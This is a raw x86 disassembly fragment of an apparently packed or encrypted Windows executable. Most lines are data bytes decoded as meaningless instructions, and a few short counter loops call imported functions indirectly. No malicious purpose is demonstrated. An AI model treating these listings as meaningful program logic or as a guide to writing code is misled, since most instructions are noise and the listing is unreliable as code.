  409dbe:	xor    ebx,DWORD PTR [ebx-0x1dc762ae]
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	out    0x86,eax
  409dcc:	adc    esi,DWORD PTR [ebp-0x12fb80d0]
  409dd2:	inc    ebx
  409dd3:	shr    BYTE PTR [edi-0x75],1
  409dd6:	test   DWORD PTR [ebx],esi
  409dd8:	or     eax,0xb11a3153
  409ddd:	sbb    al,BYTE PTR [eax+0x57da580c]
  409de3:	inc    ebp
  409de4:	jp     0x409dec
  409de6:	mul    BYTE PTR [edx-0x71ad43f2]
  409dec:	push   esp
  409ded:	mov    ebp,0xa3f74854
  409df2:	inc    ebp
  409df3:	inc    esp
  409df4:	sub    cl,0xb0
  409df7:	outs   dx,DWORD PTR ds:[esi]
  409df8:	popf   
  409df9:	dec    eax
  409dfa:	mov    edx,0x4ca5507
  409dff:	mov    ah,0x2
  409e01:	nop
  409e02:	aad    0xa9
  409e04:	fnstsw WORD PTR [ecx+ebp*2+0x41]
  409e08:	push   ss
  409e09:	mov    ebp,0x9428a915
  409e0e:	jb     0x409d99
  409e10:	adc    al,0xe4
  409e12:	(bad)  [ecx+0x33]
  409e15:	in     eax,0xc2
  409e17:	cli    
  409e18:	arpl   WORD PTR [esp+ebp*1],si
  409e1b:	sbb    DWORD PTR [eax+0x76],0x70
  409e1f:	outs   dx,BYTE PTR ds:[esi]
  409e20:	repnz sub DWORD PTR [ebx-0x7c52d8fd],esi
  409e27:	std    
  409e28:	dec    ebp
  409e29:	pop    ss
  409e2a:	mov    BYTE PTR [edi],0x72
  409e2d:	bound  esi,QWORD PTR [esi+0x2d507cb6]
  409e33:	xchg   esp,eax
  409e34:	iret   
  409e35:	out    0xa5,al
  409e37:	cmc    
  409e38:	pop    edx
  409e39:	rcl    BYTE PTR [ecx],0x61
  409e3c:	mov    esp,?
  409e3e:	pop    ss
  409e3f:	rol    ah,0xad
  409e42:	or     eax,0xebee4123
  409e47:	retf   
  409e48:	xchg   dh,ah
  409e4a:	push   esp
  409e4b:	ror    DWORD PTR [ebx],cl
  409e4d:	iret   
  409e4e:	sub    al,0x9d
  409e50:	add    al,0x21
  409e52:	aad    0xe5
  409e54:	hlt    
  409e55:	popf   
  409e56:	mov    dh,0x86
  409e58:	(bad)  
  409e59:	sbb    BYTE PTR [ebx+0x57561fc7],cl
  409e5f:	dec    ecx
  409e60:	adc    DWORD PTR [ebx+0x16],0x83faa28c
  409e67:	pop    es
  409e68:	int3   
  409e69:	or     al,0xdf
  409e6b:	neg    BYTE PTR [edx-0x60]
  409e6e:	imul   eax,DWORD PTR ds:0x207236a3,0xffffffc0
  409e75:	frstor [esi]
  409e77:	cmp    ebp,DWORD PTR [ecx]
  409e79:	sub    BYTE PTR [ebp+0x69],ah
  409e7c:	adc    eax,0x908719d8
  409e81:	or     BYTE PTR [eax],0x42
  409e84:	xor    eax,0xab7027f7
  409e89:	les    edi,FWORD PTR [ecx+0x40]
  409e8c:	xchg   BYTE PTR [esi-0x8],ch
  409e8f:	jle    0x409f03
  409e91:	stos   DWORD PTR es:[edi],eax
  409e92:	in     al,0xd6
  409e94:	mov    eax,ds:0x56bdcc0e
  409e99:	or     al,0x4f
  409e9b:	add    ebp,DWORD PTR [esp+ebx*1]
  409e9e:	scas   al,BYTE PTR es:[edi]
  409e9f:	adc    ecx,DWORD PTR ds:0x782b3261
  409ea5:	mov    ds:0xada56ae1,eax
  409eaa:	mov    ah,BYTE PTR [esi+eax*2+0x12]
  409eae:	aam    0x5b
  409eb0:	not    DWORD PTR [edx-0x76]
  409eb3:	mov    esp,0xf8b77d99
  409eb8:	sub    eax,0xa1c6e447
  409ebd:	or     DWORD PTR [bx],edi
  409ec0:	call   0xb7afef55
  409ec5:	add    DWORD PTR [esi],0x4d
  409ec8:	repz or DWORD PTR fs:[ebx],0xc63be46a
  409ed0:	cmp    al,BYTE PTR [edx+esi*8]
  409ed3:	mov    dl,0x31
  409ed5:	daa    
  409ed6:	int3   
  409ed7:	mov    al,dl
  409ed9:	mov    ds:0xdd740e58,eax
  409ede:	popf   
  409edf:	cld    
  409ee0:	into   
  409ee1:	xchg   BYTE PTR [eax-0x30],al
  409ee4:	mov    ebx,DWORD PTR [ebp+0x42]
  409ee7:	inc    edx
  409ee8:	lds    ebx,FWORD PTR ds:0x822f3a3b
  409eee:	add    eax,DWORD PTR [edi-0x47]
  409ef1:	cmp    eax,0xb3f0f0a0
  409ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ef7:	mov    dl,0x49
  409ef9:	mov    BYTE PTR [eax],bh
  409efb:	push   0xbf324a64
  409f00:	les    ebx,FWORD PTR [ecx+0x78c3ec24]
  409f06:	xchg   edx,eax
  409f07:	and    edi,DWORD PTR [eax+0x796c8d2b]
  409f0d:	pop    eax
  409f0e:	cmp    cl,BYTE PTR [ebx+0x439773c1]
  409f14:	push   edi
  409f15:	shl    edx,cl
  409f17:	rcr    DWORD PTR ds:0xcf7c2734,1
  409f1d:	fcomp  QWORD PTR [ebx]
  409f1f:	push   edi
  409f20:	fcom   st(2)
  409f22:	xchg   ecx,eax
  409f23:	cmp    al,BYTE PTR ds:0x389dab6b
  409f29:	jg     0x409f64
  409f2b:	inc    edx
  409f2c:	popa   
  409f2d:	ret    0xd2a2
  409f30:	sbb    al,0x17
  409f32:	fcom   QWORD PTR [ebp+0x43]
  409f35:	lea    edx,[eax]
  409f37:	fadd   QWORD PTR [eax+0x37]
  409f3a:	mov    WORD PTR [edx-0x4d109488],gs
  409f40:	inc    esp
  409f41:	and    BYTE PTR [eax+0x1c],0x80
  409f45:	pop    ebx
  409f46:	(bad)  [edi+eiz*2]
  409f49:	idiv   DWORD PTR [eax+0x4b]
  409f4c:	dec    BYTE PTR [eax]
  409f4e:	sbb    al,0xa5
  409f50:	push   ecx
  409f51:	std    
  409f52:	loope  0x409f3d
  409f54:	inc    ebp
  409f55:	nop
  409f56:	add    bh,BYTE PTR [esi-0x7aa7ff5c]
  409f5c:	leave  
  409f5d:	ins    BYTE PTR es:[edi],dx
  409f5e:	inc    edi
  409f5f:	(bad)  
  409f60:	pop    eax
  409f61:	jle    0x409ee3
  409f63:	adc    DWORD PTR [eax-0x31f5c0d7],edx
  409f69:	xor    dl,cl
  409f6b:	and    dh,BYTE PTR [edi-0x77a52d92]
  409f71:	and    al,0x3c
  409f73:	jmp    0xe574:0xe3aaa165
  409f7a:	xchg   esi,eax
  409f7b:	out    0x3c,al
  409f7d:	int    0xfa
  409f7f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f81:	fild   WORD PTR [eax]
  409f83:	(bad)  
  409f84:	mov    ds:0x17c20e0c,eax
  409f89:	or     al,0xe1
  409f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f8c:	and    eax,0x70b272e9
  409f91:	or     dh,BYTE PTR [edx]
  409f93:	mov    edi,0x41073f89
  409f98:	and    BYTE PTR [esi+ebx*2-0x5a],ah
  409f9c:	fstp   st(3)
  409f9e:	mov    esp,0xc48d1cd4
  409fa3:	inc    edx
  409fa4:	sar    DWORD PTR [esi+esi*8],1
  409fa7:	sti    
  409fa8:	cmp    al,0x25
  409faa:	das    
  409fab:	mov    eax,0x69bda2a
  409fb0:	ror    bl,cl
  409fb2:	in     eax,dx
  409fb3:	xor    eax,0xddfbb09b
  409fb8:	pop    edx
  409fb9:	cmp    eax,0x5dd4a953
  409fbe:	mov    WORD PTR [edi+0x1f4b83f2],fs
  409fc4:	pop    ds
  409fc5:	fucompp 
  409fc7:	out    0x57,eax
  409fc9:	shr    DWORD PTR [ecx-0x254d8866],0xb7
  409fd0:	pushf  
  409fd1:	or     dh,ch
  409fd3:	call   DWORD PTR [ecx+eiz*1-0x638dde73]
  409fda:	enter  0x27c8,0x5f
  409fde:	mov    ds,WORD PTR [edx-0x5baa3582]
  409fe4:	sbb    BYTE PTR [eax-0x7c],dl
  409fe7:	call   0x3d1280d0
  409fec:	or     eax,ebp
  409fee:	or     DWORD PTR [edi*4+0x1c111a2d],ecx
  409ff5:	ja     0x40a058
  409ff7:	loope  0x40a055
  409ff9:	sbb    BYTE PTR [ecx],ch
  409ffb:	push   0x28ff5fb6
  40a000:	xchg   BYTE PTR [eax+0x2f1b3182],bl
  40a006:	jo     0x40a01e
  40a008:	add    eax,0x9e5fbc1d
  40a00d:	adc    BYTE PTR [ebx-0x2f50f083],ah
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	cmp    DWORD PTR [bp+di-0x65],edx
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0b9
  40a133:	jne    0x40a0f8
  40a135:	cmp    BYTE PTR [ebp+0x72b01c6b],al
  40a13b:	jp     0x40a0ed
  40a13d:	pop    ss
  40a13e:	jmp    0x40a137
  40a140:	outs   dx,BYTE PTR ds:[esi]
  40a141:	clc    
  40a142:	clc    
  40a143:	mov    eax,ds:0x1cd4b390
  40a148:	retf   0x67d
  40a14b:	or     BYTE PTR [esi+edi*1+0x42],al
  40a14f:	pop    DWORD PTR ds:0x51cae6e1
  40a155:	aad    0x8
  40a157:	vcmpge_oqsd xmm4,xmm5,QWORD PTR [ebp-0x7b]
  40a15d:	push   0xffffffbb
  40a15f:	call   DWORD PTR [esi]
  40a161:	mov    DWORD PTR [eax],eax
  40a163:	add    ah,BYTE PTR [eax]
  40a165:	mov    bl,0x8d
  40a167:	inc    ecx
  40a168:	and    eax,DWORD PTR [edx+0x13]
  40a16b:	(bad)  
  40a16e:	leave  
  40a16f:	jns    0x40a10d
  40a171:	jnp    0x40a16b
  40a173:	xor    BYTE PTR [esi+edi*1],0xc1
  40a177:	jb     0x40a10d
  40a179:	dec    edx
  40a17a:	movhps xmm2,QWORD PTR [edi+ebp*2]
  40a17e:	mov    edi,0xbb11b208
  40a183:	xchg   BYTE PTR [eax],bl
  40a185:	or     al,0x15
  40a187:	add    edi,0xfe0435a7
  40a18d:	xlat   BYTE PTR ds:[ebx]
  40a18e:	jae    0x40a1d4
  40a190:	mov    cl,0xd2
  40a192:	imul   ebx,DWORD PTR [ecx-0x3ede8a46],0xf8d78636
  40a19c:	cmp    ebx,DWORD PTR [esi-0x3d]
  40a19f:	mov    BYTE PTR [ecx],cl
  40a1a1:	adc    DWORD PTR [ecx+0x54414ab8],esi
  40a1a7:	jle    0x40a165
  40a1a9:	pusha  
  40a1aa:	(bad)  
  40a1ab:	pushf  
  40a1ac:	or     eax,0x6a64a9df
  40a1b1:	adc    ebx,DWORD PTR [eax]
  40a1b3:	sub    esi,DWORD PTR [ecx+ecx*4+0x48c26e7e]
  40a1ba:	xor    eax,0x1048b31c
  40a1bf:	jbe    0x40a222
  40a1c1:	ret    
  40a1c2:	jbe    0x40a165
  40a1c4:	and    eax,DWORD PTR [esi-0x35a38c8a]
  40a1ca:	(bad)  
  40a1cb:	es push ebx
  40a1cd:	mov    gs,WORD PTR [eax]
  40a1cf:	je     0x40a197
  40a1d1:	and    cl,BYTE PTR [ebx+0x68]
  40a1d4:	sbb    DWORD PTR [edi+0x4f7d710d],eax
  40a1da:	cld    
  40a1db:	xlat   BYTE PTR ds:[ebx]
  40a1dc:	scas   al,BYTE PTR es:[edi]
  40a1dd:	xlat   BYTE PTR ds:[ebx]
  40a1de:	cld    
  40a1df:	ins    DWORD PTR es:[edi],dx
  40a1e0:	add    ebp,DWORD PTR [eax+0x7504cb21]
  40a1e6:	out    0x3e,al
  40a1e8:	mov    bh,BYTE PTR [ebx+0x3aa6315]
  40a1ee:	icebp  
  40a1ef:	popa   
  40a1f0:	pop    ebp
  40a1f1:	add    bh,BYTE PTR [edx+0x3f]
  40a1f4:	popf   
  40a1f5:	cmp    BYTE PTR [edx-0x2c],dh
  40a1f8:	dec    eax
  40a1f9:	xor    eax,0x19f50371
  40a1fe:	rcr    DWORD PTR [esi],cl
  40a200:	xchg   edi,eax
  40a201:	ret    0x6bdb
  40a204:	gs leave 
  40a206:	out    dx,eax
  40a207:	jle    0x40a282
  40a209:	adc    ah,BYTE PTR [ecx+edx*4-0x2e15ddda]
  40a210:	xchg   ebp,eax
  40a211:	jmp    0x18032fe0
  40a216:	daa    
  40a217:	ins    DWORD PTR es:[edi],dx
  40a218:	jg     0x40a27b
  40a21a:	mov    al,ds:0x6d5e7a0f
  40a21f:	test   BYTE PTR [edi-0x689b3fc4],dh
  40a225:	sahf   
  40a226:	test   esp,ecx
  40a228:	pop    ebp
  40a229:	sub    eax,0xfe663e7e
  40a22e:	inc    ecx
  40a22f:	adc    eax,0xa26ed875
  40a234:	mov    eax,ds:0xf4610b6b
  40a239:	xor    edx,esp
  40a23b:	mov    ds:0x2340a1e1,al
  40a240:	inc    edi
  40a241:	call   0x7fec:0x2cdff88d
  40a248:	cmp    bh,BYTE PTR [edx+0x5c11de3c]
  40a24e:	std    
  40a24f:	jns    0x40a1fd
  40a251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a252:	jae    0x40a1e7
  40a254:	and    DWORD PTR [ebp-0xd],edi
  40a257:	outs   dx,DWORD PTR ds:[esi]
  40a258:	mov    edx,edx
  40a25a:	jnp    0x40a1e3
  40a25c:	(bad)
  40a260:	jno    0x40a27f
  40a262:	sti    
  40a263:	loope  0x40a1f4
  40a265:	xchg   edi,eax
  40a266:	sub    eax,0x40db258e
  40a26b:	pop    edi
  40a26c:	outs   dx,DWORD PTR ds:[esi]
  40a26d:	sub    eax,0x894149fd
  40a272:	jmp    DWORD PTR [ebx]
  40a274:	xor    esi,DWORD PTR [edi]
  40a276:	aaa    
  40a277:	adc    eax,0xb320b37b
  40a27c:	punpckldq xmm0,XMMWORD PTR [esi+eiz*4-0x54c34863]
  40a285:	pop    ebx
  40a286:	mov    ds:0xbd8b1e8b,eax
  40a28b:	lds    edi,FWORD PTR [ebx-0x41bf47cf]
  40a291:	pop    ds
  40a292:	pop    ebx
  40a293:	sub    BYTE PTR [ebx-0x53263d15],0x95
  40a29a:	add    ebx,edi
  40a29c:	xor    al,BYTE PTR [esi+0x18]
  40a29f:	scas   eax,DWORD PTR es:[edi]
  40a2a0:	rol    DWORD PTR [esi+0x1bcf23ef],0x45
  40a2a7:	stos   DWORD PTR es:[edi],eax
  40a2a8:	mov    ah,BYTE PTR [edi+0x1c]
  40a2ab:	inc    eax
  40a2ac:	lods   al,BYTE PTR ds:[esi]
  40a2ad:	in     eax,0x9d
  40a2af:	pop    esi
  40a2b0:	mov    esp,0xb3ad909b
  40a2b5:	push   0x84afa116
  40a2ba:	xchg   edx,eax
  40a2bb:	iret   
  40a2bc:	out    0xb,al
  40a2be:	mov    ds:0xf597c1d0,eax
  40a2c3:	dec    edx
  40a2c4:	aaa    
  40a2c5:	xor    DWORD PTR [eax-0x302f5141],0x55d473a6
  40a2cf:	push   esp
  40a2d0:	mov    edx,DWORD PTR [ecx+edx*4]
  40a2d3:	and    DWORD PTR [ebx-0xe1f6d49],ebx
  40a2d9:	loop   0x40a278
  40a2db:	mov    edi,0xd0d37e7b
  40a2e0:	dec    eax
  40a2e1:	mov    eax,0xfc7339a2
  40a2e6:	ficomp DWORD PTR [esi+eax*8]
  40a2e9:	jb     0x40a27d
  40a2eb:	jle    0x40a365
  40a2ed:	push   cs
  40a2ee:	les    eax,FWORD PTR [eax+0x302ae00a]
  40a2f4:	repnz adc BYTE PTR [ecx],bl
  40a2f7:	in     eax,0xa3
  40a2f9:	jno    0x40a365
  40a2fb:	enter  0x4b15,0xb8
  40a2ff:	retf   
  40a300:	test   al,0x72
  40a302:	and    eax,0x532a8063
  40a307:	(bad)  
  40a308:	mov    bl,0x76
  40a30a:	sar    ecx,0xe
  40a30d:	mov    DWORD PTR [esi+0x48],ebp
  40a310:	jb     0x40a2b6
  40a312:	dec    edi
  40a313:	sti    
  40a314:	inc    ebp
  40a315:	xor    al,0x14
  40a317:	pop    edx
  40a318:	imul   edx,DWORD PTR [eax+0x5b],0x16
  40a31c:	jnp    0x40a304
  40a31e:	and    edi,DWORD PTR [ebx+0x56712f3d]
  40a324:	mov    dh,0xcb
  40a326:	call   0xec3ba1bf
  40a32b:	push   ds
  40a32c:	cmp    bh,0x48
  40a32f:	sbb    eax,DWORD PTR [ebx-0x1b]
  40a332:	cs sub eax,0x54df87f7
  40a338:	aad    0x16
  40a33a:	fstp   st(3)
  40a33c:	int    0x15
  40a33e:	or     al,0x4c
  40a340:	(bad)  
  40a341:	adc    al,0xc5
  40a343:	into   
  40a344:	xor    BYTE PTR [edx+eiz*8+0x68],dl
  40a348:	mov    esi,0x9acc215a
  40a34d:	nop
  40a34e:	or     cl,ah
  40a350:	cmp    ebp,DWORD PTR [ebx-0x2b6d9f47]
  40a356:	mov    ebx,0x4407d68
  40a35b:	mov    dl,0xc2
  40a35d:	jecxz  0x40a3a2
  40a35f:	sbb    dl,bh
  40a361:	jo     0x40a2fb
  40a363:	(bad)  
  40a364:	repnz pop ecx
  40a366:	xor    al,BYTE PTR [ecx+0x2058de9f]
  40a36c:	mov    BYTE PTR [esi+eiz*1-0x7fedad0],dh
  40a373:	sbb    al,0xfd
  40a375:	jns    0x40a371
  40a377:	mov    eax,ds:0x33e84d8b
  40a37c:	enter  0x2581,0xfb
  40a380:	xor    eax,0x43
  40a385:	add    BYTE PTR [eax],al
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	repnz cmp al,0x4c
  40a49e:	sub    DWORD PTR [esi+ebp*8+0x7e],ecx
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a437
  40a4a8:	push   edi
  40a4a9:	arpl   si,si
  40a4ab:	add    al,0xf2
  40a4ad:	gs dec esi
  40a4af:	into   
  40a4b0:	cs aaa 
  40a4b2:	in     al,0xee
  40a4b4:	jl     0x40a4d6
  40a4b6:	dec    esi
  40a4b7:	mov    dh,0xf4
  40a4b9:	mov    eax,0xb03aa50
  40a4be:	hlt    
  40a4bf:	mov    eax,0x6fb54d57
  40a4c4:	ret    
  40a4c5:	sub    al,0x63
  40a4c7:	inc    edi
  40a4c8:	es loop 0x40a529
  40a4cb:	leave  
  40a4cc:	jb     0x40a52e
  40a4ce:	cmp    eax,0xe03f0c03
  40a4d3:	pop    ss
  40a4d4:	das    
  40a4d5:	push   eax
  40a4d6:	mov    bl,0xe1
  40a4d8:	not    DWORD PTR [esi+0x11c4eb13]
  40a4de:	in     eax,dx
  40a4df:	scas   eax,DWORD PTR es:[edi]
  40a4e0:	pop    es
  40a4e1:	jmp    0x40a551
  40a4e3:	push   0xffffffc1
  40a4e5:	lds    edi,FWORD PTR [ebp+0x47b4740b]
  40a4eb:	mov    ds:0x7e6fb9c7,al
  40a4f0:	jo     0x40a479
  40a4f2:	adc    ah,BYTE PTR [esi]
  40a4f4:	aam    0xc5
  40a4f6:	rol    BYTE PTR [ebp-0x68086893],cl
  40a4fc:	sbb    ecx,DWORD PTR ss:[ecx-0x4a88b334]
  40a503:	sub    DWORD PTR [ebx],0xffffff96
  40a506:	dec    edi
  40a507:	inc    edx
  40a508:	fisttp QWORD PTR [ecx]
  40a50a:	mov    esi,DWORD PTR [edx+0x35]
  40a50d:	rcl    BYTE PTR [edx-0x32],cl
  40a510:	jge    0x40a521
  40a512:	fistp  DWORD PTR [ebp+0x52]
  40a515:	mov    eax,0x7259d2e3
  40a51a:	sub    BYTE PTR [ebp+0x7b],0xd
  40a51e:	aad    0xc6
  40a520:	sub    al,0x6f
  40a522:	sbb    BYTE PTR [ecx],cl
  40a524:	xchg   esi,ecx
  40a526:	out    0x45,al
  40a528:	mov    dh,0xea
  40a52a:	dec    edi
  40a52b:	or     eax,0xad921e33
  40a530:	rcr    edi,0x4b
  40a533:	lods   eax,DWORD PTR ds:[esi]
  40a534:	pop    ds
  40a535:	clc    
  40a536:	ja     0x40a505
  40a538:	iret   
  40a539:	dec    esp
  40a53a:	fisttp DWORD PTR [esi+0x4d7ea5ca]
  40a540:	std    
  40a541:	inc    ecx
  40a542:	push   edx
  40a543:	lods   eax,DWORD PTR ds:[esi]
  40a544:	mov    bh,0xa4
  40a546:	push   edi
  40a547:	(bad)  
  40a548:	lar    esi,WORD PTR [ebx]
  40a54b:	ss test al,0x2b
  40a54e:	ret    0x66e1
  40a551:	mov    WORD PTR [esi-0x60],?
  40a554:	mov    ah,0xc7
  40a556:	out    0xc8,eax
  40a558:	fs and eax,0x419f2d1f
  40a55e:	inc    edi
  40a55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a560:	fucomp st(4)
  40a562:	icebp  
  40a563:	pop    ebp
  40a564:	aaa    
  40a565:	sub    eax,eax
  40a567:	inc    ecx
  40a568:	xchg   ecx,eax
  40a569:	mov    edx,DWORD PTR [eax]
  40a56b:	xor    al,0xc2
  40a56d:	lds    eax,FWORD PTR [eax]
  40a56f:	adc    eax,0x2ae9f7b2
  40a574:	stc    
  40a575:	push   esp
  40a576:	pop    edx
  40a577:	mov    ds:0xd0f5bbe9,eax
  40a57c:	pop    ebx
  40a57d:	sub    BYTE PTR [eax-0x57bc9d8b],bl
  40a583:	and    BYTE PTR [eax-0x59],bh
  40a586:	xchg   ecx,eax
  40a587:	xchg   ebx,eax
  40a588:	icebp  
  40a589:	cmp    eax,0x4362d014
  40a58e:	cmp    al,ch
  40a590:	mov    ds:0xa4b68952,eax
  40a595:	mov    DWORD PTR [ebp+0x8129c62],ebp
  40a59b:	push   edi
  40a59c:	pop    edi
  40a59d:	inc    ebp
  40a59e:	call   0xea01:0x7379157f
  40a5a5:	mov    ah,0xff
  40a5a7:	xor    al,0x5f
  40a5a9:	cmp    DWORD PTR [ebx+eiz*1-0x43],0x7530f81
  40a5b1:	pushf  
  40a5b2:	xor    eax,0x16e75502
  40a5b7:	or     edi,esi
  40a5b9:	scas   al,BYTE PTR es:[edi]
  40a5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5bb:	lods   al,BYTE PTR ds:[esi]
  40a5bc:	(bad)  
  40a5bd:	fsubr  DWORD PTR [edx]
  40a5bf:	ja     0x40a572
  40a5c1:	into   
  40a5c2:	and    ah,BYTE PTR [ecx-0x64a02188]
  40a5c8:	or     eax,0x89fad83b
  40a5cd:	pop    edi
  40a5ce:	pop    es
  40a5cf:	pop    ss
  40a5d0:	test   esp,0xbba608b2
  40a5d6:	addr16 es cmp bp,dx
  40a5db:	loope  0x40a56e
  40a5dd:	dec    edi
  40a5de:	pop    es
  40a5df:	shl    BYTE PTR [ebx+0x6baf626f],cl
  40a5e5:	push   esi
  40a5e6:	jmp    0x63a5c0
  40a5eb:	cdq    
  40a5ec:	dec    esp
  40a5ed:	and    esi,edi
  40a5ef:	std    
  40a5f0:	call   0x33c8:0x57f9c348
  40a5f7:	lahf   
  40a5f8:	pop    ds
  40a5f9:	push   cs
  40a5fa:	mov    WORD PTR [esi-0x4f],gs
  40a5fd:	add    cl,BYTE PTR [ebp-0x4]
  40a600:	mov    ah,0x9d
  40a602:	adc    al,BYTE PTR [ebp+0xc]
  40a605:	pop    ebx
  40a606:	aad    0xb0
  40a608:	sbb    BYTE PTR [ebx],ah
  40a60a:	outs   dx,DWORD PTR ds:[esi]
  40a60b:	mov    dh,0x3e
  40a60d:	sbb    DWORD PTR [ecx+eax*1-0x46a059fe],esp
  40a614:	mov    ecx,ecx
  40a616:	imul   edx,ecx,0xea7aaf61
  40a61c:	dec    ebx
  40a61d:	fistp  DWORD PTR [edx-0x14]
  40a620:	push   edx
  40a621:	iret   
  40a622:	lock (bad) 
  40a624:	enter  0xc8a3,0xc
  40a628:	jecxz  0x40a5f2
  40a62a:	and    al,0x4b
  40a62c:	int3   
  40a62d:	or     eax,DWORD PTR [ebp-0x23a08247]
  40a633:	or     al,0xb7
  40a635:	add    DWORD PTR ds:0xae83d3c4,esi
  40a63b:	daa    
  40a63c:	int    0xda
  40a63e:	outs   dx,BYTE PTR ds:[esi]
  40a63f:	mov    ecx,0xf0e03493
  40a644:	mov    ecx,0xc718c89b
  40a649:	mov    edi,0xeebbc725
  40a64e:	xor    bh,BYTE PTR [esi]
  40a650:	jno    0x40a660
  40a652:	frstor [edi+0x52]
  40a655:	cli    
  40a656:	cmp    BYTE PTR [eax-0x51],ch
  40a659:	fwait
  40a65a:	pop    eax
  40a65b:	lahf   
  40a65c:	in     eax,0xd3
  40a65e:	inc    ecx
  40a65f:	hlt    
  40a660:	xchg   ecx,edx
  40a662:	xchg   ecx,eax
  40a663:	into   
  40a664:	retf   0x4fe7
  40a667:	inc    eax
  40a668:	lock xchg ebx,eax
  40a66a:	mov    ds:0xcac7f5c,al
  40a66f:	ss addr16 je 0x40a62d
  40a673:	adc    esi,0x47
